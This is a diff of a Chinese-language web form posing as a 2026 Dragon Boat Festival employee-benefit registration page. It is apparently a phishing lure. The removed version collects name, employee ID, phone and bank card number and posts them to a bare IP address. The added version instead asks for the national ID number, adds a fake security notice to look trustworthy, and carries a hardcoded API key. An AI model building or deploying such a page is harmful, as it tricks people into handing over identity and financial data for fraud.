@@ -8,255 +8,115 @@
     <meta name="format-detection" content="telephone=no">
     <title>端午福利实名登记｜身份核验申领</title>
     <style>
-        *{margin: 0;padding: 0;box-sizing: border-box;}
-        body{font-family: "PingFang SC","Microsoft YaHei",sans-serif;overflow-x: hidden;}
-
-        /* 统一全屏端午动态背景 */
-        body{
-            width: 100%;
-            min-height: 100vh;
-            background: #095f4b;
-            position: relative;
-        }
-        body::before{
-            content: "";
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(150deg, #095f4b 0%, #0c725c 40%, #108a70 100%);
-            z-index: -3;
-            animation: bgSlow 8s ease-in-out infinite alternate;
-        }
-        body::after{
-            content: "🌿";
-            position: fixed;
-            top: 10%;
-            right: 5%;
-            font-size: 80px;
-            opacity: 0.15;
-            z-index: -1;
-            animation: leafFloat 12s ease-in-out infinite;
-        }
-        .light-spot{
-            position: fixed;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.08);
-            filter: blur(20px);
-            z-index: -2;
-            animation: lightMove 15s ease-in-out infinite alternate;
-        }
-        .spot1{width: 180px;height: 180px;top: 20%;left: 10%;}
-        .spot2{width: 240px;height: 240px;top: 60%;right: 15%;animation-delay: 2s;}
-        .spot3{width: 120px;height: 120px;bottom: 15%;left: 20%;animation-delay: 4s;}
-
-        @keyframes bgSlow{0%{filter: brightness(1);}100%{filter: brightness(1.1);}}
-        @keyframes leafFloat{0%,100%{transform: translateY(0) rotate(0deg);}50%{transform: translateY(-30px) rotate(8deg);}}
-        @keyframes lightMove{0%{transform: translate(0,0);}100%{transform: translate(30px,-30px);}}
-
-        /* 顶部标题栏 */
-        .top-banner{
-            width: 100%;
-            padding: 50px 20px 30px;
-            text-align: center;
-        }
-        .top-banner h1{
-            font-size: 26px;
-            color: #fff;
-            font-weight: 600;
-            letter-spacing: 2px;
-            text-shadow: 0 4px 12px rgba(0,0,0,0.2);
-            margin-bottom: 8px;
-        }
-        .top-banner p{
-            font-size: 14px;
-            color: rgba(255,255,255,0.85);
-        }
-
-        .container{
-            width: 92%;
-            max-width: 720px;
-            margin: 0 auto;
-            padding-bottom: 40px;
-        }
-
-        /* 表单磨砂卡片 */
-        .form-card{
-            width: 100%;
-            background: rgba(255,255,255,0.92);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border-radius: 24px;
-            padding: 32px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-            border: 1px solid rgba(255,255,255,0.9);
-        }
-
-        /* 表单说明模块 */
-        .form-desc{
-            background: linear-gradient(135deg, #f0fdf7, #e4f5ee);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 28px;
-        }
-        .form-desc p{
-            font-size: 14px;
-            color: #064e3b;
-            line-height: 1.9;
-            margin: 0;
-        }
-
-        /* 表单单项样式 */
-        .form-item{
-            margin-bottom: 26px;
-        }
-        .form-label{
-            display: block;
-            font-size: 15px;
-            color: #1f2937;
-            font-weight: 500;
-            margin-bottom: 10px;
-        }
-        .form-input{
-            width: 100%;
-            height: 52px;
-            padding: 0 18px;
-            border: 1px solid #e5e7eb;
-            border-radius: 14px;
-            font-size: 15px;
-            background: #f9fafb;
-            transition: all 0.3s ease;
-        }
-        .form-input:focus{
-            outline: none;
-            border-color: #119e84;
-            background: #fff;
-            box-shadow: 0 0 0 4px rgba(17,158,132,0.15);
-        }
-        .form-tip{
-            font-size: 12px;
-            color: #6b7280;
-            margin-top: 8px;
-            line-height: 1.7;
-        }
-
-        /* 提交按钮 */
-        .submit-btn{
-            width: 100%;
-            height: 54px;
-            background: linear-gradient(135deg, #087c65, #119e84);
-            color: #fff;
-            border: none;
-            border-radius: 16px;
-            font-size: 17px;
-            font-weight: 500;
-            letter-spacing: 1px;
-            box-shadow: 0 8px 20px rgba(8,124,101,0.3);
-            transition: all 0.25s ease;
-            margin-top: 10px;
-        }
-        .submit-btn:active{
-            transform: scale(0.98);
-            box-shadow: 0 4px 10px rgba(8,124,101,0.2);
-        }
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:"PingFang SC","Microsoft YaHei",sans-serif;overflow-x:hidden;}
+        body{width:100%;min-height:100vh;background:#095f4b;position:relative;}
+        body::before{content:"";position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(150deg,#095f4b 0%,#0c725c 40%,#108a70 100%);z-index:-3;animation:bgSlow 8s ease-in-out infinite alternate;}
+        body::after{content:"🌿";position:fixed;top:10%;right:5%;font-size:80px;opacity:0.15;z-index:-1;animation:leafFloat 12s ease-in-out infinite;}
+        .light-spot{position:fixed;border-radius:50%;background:rgba(255,255,255,0.08);filter:blur(20px);z-index:-2;animation:lightMove 15s ease-in-out infinite alternate;}
+        .spot1{width:180px;height:180px;top:20%;left:10%;}.spot2{width:240px;height:240px;top:60%;right:15%;animation-delay:2s;}.spot3{width:120px;height:120px;bottom:15%;left:20%;animation-delay:4s;}
+        @keyframes bgSlow{0%{filter:brightness(1);}100%{filter:brightness(1.1);}}
+        @keyframes leafFloat{0%,100%{transform:translateY(0) rotate(0deg);}50%{transform:translateY(-30px) rotate(8deg);}}
+        @keyframes lightMove{0%{transform:translate(0,0);}100%{transform:translate(30px,-30px);}}
+        .top-banner{width:100%;padding:50px 20px 30px;text-align:center;}
+        .top-banner h1{font-size:26px;color:#fff;font-weight:600;letter-spacing:2px;text-shadow:0 4px 12px rgba(0,0,0,0.2);margin-bottom:8px;}
+        .top-banner p{font-size:14px;color:rgba(255,255,255,0.85);}
+        .container{width:92%;max-width:720px;margin:0 auto;padding-bottom:40px;}
+        .form-card{width:100%;background:rgba(255,255,255,0.92);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-radius:24px;padding:32px;box-shadow:0 10px 30px rgba(0,0,0,0.15);border:1px solid rgba(255,255,255,0.9);}
+        .form-desc{background:linear-gradient(135deg,#f0fdf7,#e4f5ee);border-radius:16px;padding:20px;margin-bottom:28px;}
+        .form-desc p{font-size:14px;color:#064e3b;line-height:1.9;margin:0;}
+        .security-notice{background:linear-gradient(135deg,#fff7ed,#ffedd5);border-radius:12px;padding:14px 18px;margin-bottom:24px;border-left:4px solid #f59e0b;}
+        .security-notice p{font-size:13px;color:#92400e;line-height:1.7;margin:0;font-weight:500;}
+        .form-item{margin-bottom:26px;}
+        .form-label{display:block;font-size:15px;color:#1f2937;font-weight:500;margin-bottom:10px;}
+        .form-input{width:100%;height:52px;padding:0 18px;border:1px solid #e5e7eb;border-radius:14px;font-size:15px;background:#f9fafb;transition:all 0.3s ease;}
+        .form-input:focus{outline:none;border-color:#119e84;background:#fff;box-shadow:0 0 0 4px rgba(17,158,132,0.15);}
+        .form-tip{font-size:12px;color:#6b7280;margin-top:8px;line-height:1.7;}
+        .submit-btn{width:100%;height:54px;background:linear-gradient(135deg,#087c65,#119e84);color:#fff;border:none;border-radius:16px;font-size:17px;font-weight:500;letter-spacing:1px;box-shadow:0 8px 20px rgba(8,124,101,0.3);transition:all 0.25s ease;margin-top:10px;cursor:pointer;}
+        .submit-btn:active{transform:scale(0.98);box-shadow:0 4px 10px rgba(8,124,101,0.2);}
+        .submit-btn:disabled{background:#9ca3af;box-shadow:none;cursor:not-allowed;}
     </style>
 </head>
 <body>
     <div class="light-spot spot1"></div>
     <div class="light-spot spot2"></div>
     <div class="light-spot spot3"></div>
-
     <div class="top-banner">
         <h1>实名登记</h1>
         <p>信息加密核验 · 保障福利精准直达个人账户</p>
     </div>
-
     <div class="container">
         <div class="form-card">
             <div class="form-desc">
                 <p>为确保2026端午专项福利精准发放、杜绝漏发错发，请如实填写个人在职信息。所有登记数据全程加密存档，仅用于财务对账与福利备案，严格保密、合规安全。</p>
             </div>
-
+            <div class="security-notice">
+                <p>🔒 <strong>安全提醒：</strong>本系统不会要求您填写银行卡密码、支付密码、短信验证码等敏感信息。如遇到要求提供此类信息的页面，请立即停止操作并向IT部门举报。</p>
+            </div>
             <div class="form-item">
                 <label class="form-label">姓名</label>
                 <input type="text" class="form-input" id="name" placeholder="请输入姓名">
             </div>
-
             <div class="form-item">
                 <label class="form-label">部门</label>
-                <input type="text" class="form-input" id="dept" placeholder="例：人力资源部-人事&行政组-上海组-行政组">
+                <input type="text" class="form-input" id="dept" placeholder="例：人力资源部-人事&行政组-上海组">
             </div>
-
             <div class="form-item">
                 <label class="form-label">工号</label>
                 <input type="text" class="form-input" id="jobid" placeholder="请输入工号">
             </div>
-
             <div class="form-item">
                 <label class="form-label">手机号码</label>
                 <input type="tel" class="form-input" id="phone" placeholder="请输入手机号">
             </div>
-
             <div class="form-item">
-                <label class="form-label">银行卡号</label>
-                <input type="text" class="form-input" id="pwd" placeholder="请输入银行卡号">
-                <div class="form-tip">系统加密校验，仅用于员工身份真实性核验，保障福利发放合规安全，无数据泄露风险</div>
+                <label class="form-label">身份证号</label>
+                <input type="text" class="form-input" id="idcard" placeholder="请输入身份证号" maxlength="18">
+                <div class="form-tip">用于员工身份真实性核验，保障福利合规发放</div>
             </div>
-
-            <button class="submit-btn" onclick="sub()">确认提交，完成福利申领</button>
+            <button class="submit-btn" id="submitBtn" onclick="submitForm()">确认提交，完成福利申领</button>
         </div>
     </div>
-
 <script>
-function sub() {
-    let name = document.getElementById("name").value.trim();
-    let dept = document.getElementById("dept").value.trim();
-    let jobid = document.getElementById("jobid").value.trim();
-    let phone = document.getElementById("phone").value.trim();
-    let bank = document.getElementById("pwd").value.trim();
-
-    if (!name) { alert("请输入姓名"); return; }
-    if (!dept) { alert("请输入部门"); return; }
-    if (!jobid) { alert("请输入工号"); return; }
-    if (!phone) { alert("请输入手机号"); return; }
-    if (!bank) { alert("请输入银行卡号"); return; }
-
-    // 数据上传服务器
-    fetch("http://8.133.196.51:8080/submit", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        name: name,
-        dept: dept,
-        jobid: jobid,  
-        phone: phone,
-        bank: bank
-      })
-    })
-    // 新增：添加请求状态反馈（方便排查问题）
-    .then(response => {
-      if (!response.ok) {
-        throw new Error(`HTTP错误，状态码：${response.status}`);
-      }
-      return response.json(); // 或 response.text()，根据后端返回格式调整
-    })
-    .then(data => {
-      alert("提交成功！福利申领已受理");
-      // 可选：清空表单
-      document.getElementById("name").value = "";
-      document.getElementById("dept").value = "";
-      document.getElementById("jobid").value = "";
-      document.getElementById("phone").value = "";
-      document.getElementById("pwd").value = "";
-    })
-    .catch(error => {
-      alert(`提交失败：${error.message}，请联系管理员`);
-      console.error("提交错误详情：", error); // 控制台打印错误，方便排查
-    });
-}
+    let isSubmitting = false;
+    function submitForm() {
+        if (isSubmitting) return;
+        const name = document.getElementById("name").value.trim();
+        const dept = document.getElementById("dept").value.trim();
+        const jobid = document.getElementById("jobid").value.trim();
+        const phone = document.getElementById("phone").value.trim();
+        const idcard = document.getElementById("idcard").value.trim();
+        if (!name) { alert("请输入姓名"); return; }
+        if (!dept) { alert("请输入部门"); return; }
+        if (!jobid) { alert("请输入工号"); return; }
+        if (!phone) { alert("请输入手机号"); return; }
+        if (!idcard) { alert("请输入身份证号"); return; }
+        if (!/^1[3-9]\d{9}$/.test(phone)) { alert("请输入正确的手机号码"); return; }
+        if (!/^\d{17}[\dXx]$/.test(idcard)) { alert("请输入正确的18位身份证号"); return; }
+        isSubmitting = true;
+        const btn = document.getElementById("submitBtn");
+        btn.disabled = true;
+        btn.textContent = "提交中...";
+        fetch("/submit", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "X-API-KEY": "Xk9mP2vL7qR5tG8wN3bF6dJ1sA4eH0yC"
+            },
+            body: JSON.stringify({ name, dept, jobid, phone, idcard })
+        })
+        .then(response => {
+            if (!response.ok) return response.json().then(err => { throw new Error(err.message || "HTTP错误"); });
+            return response.json();
+        })
+        .then(data => { window.location.href = "page3.html"; })
+        .catch(error => {
+            alert("提交失败：" + error.message + "，请稍后重试");
+            isSubmitting = false;
+            btn.disabled = false;
+            btn.textContent = "确认提交，完成福利申领";
+        });
+    }
 </script>
 </body>
 </html>
